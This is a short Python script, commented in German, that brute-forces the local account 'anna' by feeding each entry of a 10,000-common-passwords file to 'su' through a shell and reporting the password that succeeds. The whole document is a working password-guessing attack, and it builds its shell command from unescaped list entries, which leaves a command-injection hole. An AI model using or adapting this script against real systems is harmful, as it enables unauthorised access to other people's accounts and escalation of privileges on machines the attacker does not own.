import subprocess

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path = "./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username = "anna"

# Funktion, die versucht, sich mit einer bestimmten Liste von Passwörtern anzumelden
def try_passwords(start_range, end_range):
    # Initialisieren des Zählers
    counter = start_range

    # Versuchen Sie jedes Passwort aus dem zugewiesenen Bereich
    with open(password_list_path, "r") as file:
        for line in file:
            # Strip newline characters und führende/trailing Leerzeichen entfernen
            password = line.strip()
            
            # Überspringen Sie Passwörter außerhalb des zugewiesenen Bereichs
            if counter < start_range or counter >= end_range:
                counter += 1
                continue
            
            # Versuchen Sie, sich mit dem aktuellen Passwort anzumelden
            command = f"echo '{password}' | su {username} 2>&1"
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Drucken des Zählers und des Fortschritts
            print(f"Versuch {counter}")
            
            # Überprüfen Sie, ob die Anmeldung erfolgreich war
            if result.returncode == 0:
                print(f"Erfolgreich angemeldet als '{username}' mit dem Passwort '{password}'")
                return password  # Beenden Sie die Funktion und geben Sie das gefundene Passwort zurück
            else:
                print(f"Fehler beim Anmelden als '{username}' mit dem Passwort '{password}': {result.stderr.decode()}")
            
            # Erhöhen des Zählers
            counter += 1

# Aufrufen der Funktion für den zugewiesenen Passwortbereich
try_passwords(0, 10000)
